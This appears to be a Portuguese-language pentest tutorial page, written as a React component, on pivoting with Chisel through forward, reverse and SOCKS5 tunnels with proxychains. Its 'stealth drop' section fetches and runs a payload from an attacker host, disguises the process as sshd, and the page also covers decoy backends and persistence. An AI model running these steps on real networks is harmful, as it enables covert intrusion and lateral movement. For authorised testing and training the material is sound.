import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Chisel() {
  return (
    <PageContainer
      title="Chisel — pivoting via HTTP/WebSocket"
      subtitle="Tunelar TCP/UDP através de firewalls corporativos via HTTP. SOCKS5 reverso, port forward bidirecional, binário único, escrito em Go."
      difficulty="avancado"
      timeToRead="18 min"
    >
      <h2>Por que Chisel manda no pivoting</h2>
      <p>
        Em engagement interno você quase sempre cai numa máquina que <strong>vê</strong> a
        rede-alvo, mas o seu Kali não vê. <strong>Chisel</strong> resolve isso encapsulando
        TCP/UDP arbitrário dentro de WebSocket sobre HTTP(S) — atravessa proxies HTTP
        corporativos, web filters e a maioria dos egress firewalls. Binário único Go (~10MB),
        cross-compilado para Linux/Windows/macOS/ARM. Sem dependência, sem agent, sem nada.
      </p>

      <ul>
        <li>
          <strong>Forward port</strong>: expor serviço local do alvo no Kali (acessar MySQL
          interno via 127.0.0.1:3306).
        </li>
        <li>
          <strong>Reverse port</strong>: expor serviço do Kali no alvo (callback de listener
          atrás de NAT).
        </li>
        <li>
          <strong>SOCKS5</strong>: o golden — proxychains aponta pro chisel e qualquer
          ferramenta (nmap, sqlmap, BloodHound.py) atravessa o pivot.
        </li>
      </ul>

      <h2>Instalação e download</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y chisel",
            out: `Setting up chisel (1.10.1-1) ...`,
            outType: "success",
          },
          {
            comment: "alternativa: download binário oficial (mais novo)",
            cmd: 'curl -L -o /tmp/chisel.gz "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz" && gunzip /tmp/chisel.gz && sudo install /tmp/chisel /usr/local/bin/',
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "chisel --version",
            out: "1.10.1",
            outType: "info",
          },
          {
            comment: "para alvo Windows (drop via SMB ou HTTP)",
            cmd: 'curl -LO "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz" && gunzip chisel_1.10.1_windows_amd64.gz && mv chisel_1.10.1_windows_amd64 chisel.exe',
            out: "(binário pronto para uplear no alvo Windows)",
            outType: "default",
          },
          {
            comment: "compilar variantes — Linux ARM, Windows 32, etc.",
            cmd: 'GOOS=linux GOARCH=arm GOARM=7 go build -ldflags="-s -w" -o chisel-armv7',
            out: "(binário 5MB para Raspberry Pi alvo)",
            outType: "muted",
          },
        ]}
      />

      <h2>Modo cliente vs servidor — quem é quem</h2>
      <p>
        <strong>Servidor</strong> escuta porta TCP (qualquer uma — geralmente 443 ou 80 para
        passar firewall). <strong>Cliente</strong> conecta no servidor e cria os túneis
        especificados. Cada túnel pode ser <em>local</em> (cliente abre porta, encaminha pro
        lado do servidor) ou <em>remoto</em> com prefixo <code>R:</code> (servidor abre porta,
        encaminha pro lado do cliente).
      </p>

      <CommandTable
        title="Sintaxe básica de túneis"
        variations={[
          {
            cmd: "client server.tld:443 8080:intranet.lan:80",
            desc: "Cliente abre 8080 local; tudo que chegar é encaminhado via servidor para intranet.lan:80.",
            output: "FORWARD direto: cliente → servidor → alvo final.",
          },
          {
            cmd: "client server.tld:443 R:9001:127.0.0.1:9001",
            desc: "Servidor abre 9001; encaminha para 127.0.0.1:9001 do cliente. REVERSE.",
            output: "Útil para receber callback no host atacante isolado.",
          },
          {
            cmd: "client server.tld:443 socks",
            desc: "Cliente abre SOCKS5 local em 1080; servidor encaminha pra qualquer IP/porta.",
            output: "Chave do pivoting: combine com proxychains.",
          },
          {
            cmd: "client server.tld:443 R:socks",
            desc: "Servidor abre SOCKS5 em 1080; encaminha para a rede do CLIENTE.",
            output: "Você roda chisel server no Kali e o cliente no alvo interno.",
          },
          {
            cmd: "server -p 443 --reverse",
            desc: "Servidor aceita túneis reverse (necessário para R:).",
            output: "Sem --reverse, qualquer R:* é negado.",
          },
          {
            cmd: "server -p 443 --auth user:pass",
            desc: "Auth básica obrigatória.",
            output: "Cliente: chisel client https://user:pass@server:443 ...",
          },
        ]}
      />

      <h2>Cenário 1: forward — Kali acessa serviço interno via alvo DMZ</h2>
      <p>
        Você comprometeu uma máquina DMZ que vê <code>10.10.20.50:1433</code> (SQL Server
        interno). O Kali não vê. Sobe chisel server no alvo DMZ, conecta cliente do Kali, e
        agora <code>localhost:1433</code> do Kali aponta pro SQL.
      </p>

      <CodeBlock
        language="bash"
        title="passo a passo (forward)"
        code={`# === No alvo DMZ (que tem IP público acessível pelo Kali) ===
./chisel server -p 8080 --reverse

# === No Kali ===
chisel client http://DMZ_IP:8080 1433:10.10.20.50:1433

# Agora qualquer ferramenta no Kali fala com o SQL interno via localhost
impacket-mssqlclient sa@127.0.0.1 -windows-auth
nmap -sV -p 1433 127.0.0.1
sqlmap -u "http://127.0.0.1:1433/..." --threads 4`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "no Kali — vê o cliente conectar e túnel ativo",
            cmd: "chisel client http://198.51.100.42:8080 1433:10.10.20.50:1433",
            out: `2026/04/03 15:11:32 client: Connecting to ws://198.51.100.42:8080
2026/04/03 15:11:32 client: tun: proxy#1 1433=>10.10.20.50:1433: Listening
2026/04/03 15:11:32 client: Connected (Latency 24ms)`,
            outType: "success",
          },
          {
            cmd: "nc -zv 127.0.0.1 1433",
            out: `Connection to 127.0.0.1 1433 port [tcp/ms-sql-s] succeeded!`,
            outType: "info",
          },
          {
            cmd: "impacket-mssqlclient 'EMPRESA/sql_user:Welcome2024!@127.0.0.1' -windows-auth",
            out: `Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ACK: Result: 1 - Microsoft SQL Server (180) (16.00.4135) 
SQL (sql_user  guest@master)>`,
            outType: "warning",
          },
        ]}
      />

      <h2>Cenário 2: reverse — alvo NAT'eado precisa expor serviço para o Kali</h2>
      <p>
        Variação mais comum em interno: o alvo está atrás de NAT, não tem IP público, então o{" "}
        <strong>Kali sobe o servidor</strong> e o alvo conecta como cliente. Os túneis usam{" "}
        <code>R:</code> para que portas abertas no Kali apontem pra serviços que só o alvo vê.
      </p>

      <CodeBlock
        language="bash"
        title="cenário NAT (Kali tem IP público / VPN; alvo só sai)"
        code={`# === No Kali (IP público ou VPN HTB/THM) ===
chisel server -p 8443 --reverse

# === No alvo interno (drop chisel via SMB, certutil, http-server) ===
./chisel client http://KALI_IP:8443 R:8080:intranet.empresa.lan:80 R:socks

# Agora no Kali:
#  - localhost:8080  → intranet.empresa.lan:80 (forward fixo)
#  - localhost:1080  → SOCKS5 para qualquer IP visível pelo alvo
curl http://127.0.0.1:8080
proxychains4 nmap -sT -Pn 10.10.20.0/24`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "Kali (servidor)",
            cmd: "chisel server -p 8443 --reverse --auth ops:S3cr3t",
            out: `2026/04/03 15:30:01 server: Reverse tunnelling enabled
2026/04/03 15:30:01 server: Fingerprint XKWv4kBh7eL...
2026/04/03 15:30:01 server: Listening on http://0.0.0.0:8443
2026/04/03 15:30:42 server: session#1: tun: proxy#R:8080=>intranet.empresa.lan:80: Listening
2026/04/03 15:30:42 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening`,
            outType: "success",
          },
          {
            comment: "no alvo (cliente Linux)",
            cmd: "./chisel client http://ops:S3cr3t@KALI_IP:8443 R:8080:intranet.empresa.lan:80 R:socks",
            out: `2026/04/03 15:30:42 client: Connecting to ws://KALI_IP:8443
2026/04/03 15:30:42 client: Connected (Latency 18ms)`,
            outType: "info",
          },
          {
            comment: "no Kali — testando intranet via túnel forward",
            cmd: "curl -s http://127.0.0.1:8080 | head -10",
            out: `<!DOCTYPE html>
<html>
<head><title>Intranet — Empresa</title></head>
<body><h1>Bem-vindo, funcionário</h1>...`,
            outType: "warning",
          },
        ]}
      />

      <h2>Cenário 3: SOCKS5 + proxychains — atravessar a rede inteira</h2>
      <p>
        Esse é o caso de uso definitivo. Com <strong>uma única conexão</strong> chisel
        configurada como SOCKS, qualquer ferramenta que aceite SOCKS (ou que você force via
        proxychains) ganha acesso à rede do alvo.
      </p>

      <CodeBlock
        language="ini"
        title="/etc/proxychains4.conf (configuração relevante)"
        code={`strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5  127.0.0.1 1080`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "túnel SOCKS já estabelecido (R:socks no cliente)",
            cmd: "ss -tlnp | grep 1080",
            out: `LISTEN  0  4096  127.0.0.1:1080  0.0.0.0:*  users:(("chisel",pid=14201,fd=11))`,
            outType: "info",
          },
          {
            comment: "scan da rede interna via SOCKS",
            cmd: "proxychains4 -q nmap -sT -Pn -p 22,80,135,389,445,3389 10.10.20.0/24",
            out: `Nmap scan report for 10.10.20.10
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
445/tcp  open  microsoft-ds

Nmap scan report for 10.10.20.50
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server`,
            outType: "warning",
          },
          {
            comment: "BloodHound.py via pivot — coleta AD da rede interna",
            cmd: "proxychains4 -q bloodhound-python -d empresa.lan -u admin -p 'P@ss123' -ns 10.10.20.10 -c All",
            out: `INFO: Found AD domain: empresa.lan
INFO: Connecting to LDAP server: dc01.empresa.lan
INFO: Found 247 users
INFO: Found 38 computers
INFO: Compressing output into 20260403_bloodhound.zip`,
            outType: "success",
          },
          {
            comment: "RDP via socks (com xfreerdp e proxychains)",
            cmd: "proxychains4 -q xfreerdp /v:10.10.20.50 /u:admin /p:'Welcome2024!' /size:1280x800",
            out: "(janela RDP abre apesar do alvo estar na rede interna)",
            outType: "info",
          },
        ]}
      />

      <h2>Auth, TLS e ofuscação</h2>
      <CommandTable
        title="Hardening do túnel"
        variations={[
          {
            cmd: "--auth user:pass",
            desc: "Basic auth simples — evita randoms se conectarem ao seu server.",
            output: "Cliente: http://user:pass@server:443",
          },
          {
            cmd: "--key /path/private.pem",
            desc: "Servidor com chave fixa (fingerprint estável para pinning).",
            output: "Cliente checa: --fingerprint sha256:...",
          },
          {
            cmd: "--tls-cert + --tls-key",
            desc: "TLS de verdade (certbot). Cliente conecta com https://.",
            output: "Tráfego indistinguível de WebSocket HTTPS comum.",
          },
          {
            cmd: "--backend http://real-site",
            desc: "Servidor age como reverse proxy: tudo que NÃO é chisel cai num site real.",
            output: "Anti-investigação: navegador casual vê site legítimo.",
          },
          {
            cmd: "--keepalive 30s",
            desc: "Mantém conexão viva atrás de NAT/firewall com timeout agressivo.",
            output: "Sem isso, idle de 60s mata o túnel.",
          },
        ]}
      />

      <CodeBlock
        language="bash"
        title="server stealth — TLS real + backend cobertura"
        code={`# Em VPS com domínio cdn.example.tld + cert Let's Encrypt
chisel server \\
  --port 443 \\
  --reverse \\
  --auth ops:$(openssl rand -hex 16) \\
  --tls-cert /etc/letsencrypt/live/cdn.example.tld/fullchain.pem \\
  --tls-key  /etc/letsencrypt/live/cdn.example.tld/privkey.pem \\
  --backend  https://cdn.example.com  \\
  --keepalive 25s

# Cliente
./chisel client \\
  --fingerprint MIIBHj... \\
  https://ops:hash@cdn.example.tld:443 \\
  R:socks`}
      />

      <h2>Drop e execução stealth no alvo</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "no alvo Linux: download via curl + execução em /dev/shm (sem touch em disco persistente)",
            cmd: 'curl -sLo /dev/shm/.x https://kali.attacker/chisel && chmod +x /dev/shm/.x && /dev/shm/.x client http://kali:8443 R:socks &',
            out: "[1] 14872",
            outType: "muted",
          },
          {
            comment: "Windows: certutil + execução em background",
            cmd: 'certutil -urlcache -split -f http://kali:8080/c.exe %TEMP%\\c.exe & start /b %TEMP%\\c.exe client http://kali:8443 R:socks',
            out: "(processo solto sem janela)",
            outType: "warning",
          },
          {
            comment: "renomear processo no Linux para esconder",
            cmd: "exec -a /usr/sbin/sshd /dev/shm/.x client http://kali:8443 R:socks &",
            out: "(aparece como sshd no ps -ef — a checagem precisa do hash)",
            outType: "default",
          },
        ]}
      />

      <h2>Multi-túnel em uma sessão só</h2>
      <p>
        Você pode declarar quantos túneis quiser em uma única invocação. Útil para abrir RDP +
        SMB + SOCKS + HTTP de uma vez sem múltiplas conexões TCP no firewall.
      </p>

      <CodeBlock
        language="bash"
        title="cliente multi-túnel"
        code={`./chisel client http://kali:8443 \\
  R:3389:10.10.20.50:3389 \\
  R:445:dc01.empresa.lan:445 \\
  R:1433:sqlsrv.empresa.lan:1433 \\
  R:8080:intranet.empresa.lan:80 \\
  R:socks`}
      />

      <PracticeBox
        title="Pivot completo em laboratório local — SOCKS atravessando 'rede interna'"
        goal="Simular pivoting end-to-end com 2 terminais: subir chisel server, conectar cliente apontando para SOCKS, e enxergar serviço local via proxychains como se fosse rede remota."
        steps={[
          "Aba 1: chisel server -p 8443 --reverse",
          "Aba 2: chisel client http://127.0.0.1:8443 R:socks",
          "Aba 3: confira que 1080 abriu no localhost.",
          "Suba um nginx/python -m http.server na porta 8000.",
          "Use proxychains via SOCKS para acessá-lo (simulando ferramenta remota).",
        ]}
        command={`# Aba 1
chisel server -p 8443 --reverse

# Aba 2
chisel client http://127.0.0.1:8443 R:socks

# Aba 3
ss -tlnp | grep -E '1080|8443'
python3 -m http.server 8000 --bind 127.0.0.1 &
proxychains4 -q curl -s http://127.0.0.1:8000 | head`}
        expected={`LISTEN  0  4096  127.0.0.1:1080  0.0.0.0:*  users:(("chisel",pid=...))
LISTEN  0  4096  *:8443           *:*        users:(("chisel",pid=...))

<!DOCTYPE HTML>
<html>
<title>Directory listing for /</title>
...`}
        verify="Se o curl via proxychains baixou a listagem do http.server, seu túnel SOCKS está funcional. Em alvo real, troque 127.0.0.1 pelos IPs internos da rede do cliente."
      />

      <AlertBox type="warning" title="Velocidade e estabilidade do túnel">
        Chisel sobre WebSocket adiciona overhead. SOCKS via chisel é ótimo para HTTP/SQL/SMB,
        mas <strong>não use para transferências grandes</strong> (dump de NTDS.dit de 1GB,
        pcap massivo). Para isso, faça compressão local primeiro (<code>tar czf</code>) e
        transfira pedaço por pedaço — ou suba SCP via SOCKS.
      </AlertBox>

      <AlertBox type="danger" title="Combo Chisel + Pwncat = pivoting + persistência">
        Padrão profissional: pwncat-cs entrega a sessão e dropa chisel client com persistence
        via systemd. Se a shell cair, o túnel volta sozinho no próximo boot. Documente toda
        binário/serviço criado para limpar no fim do engagement.
      </AlertBox>
    </PageContainer>
  );
}
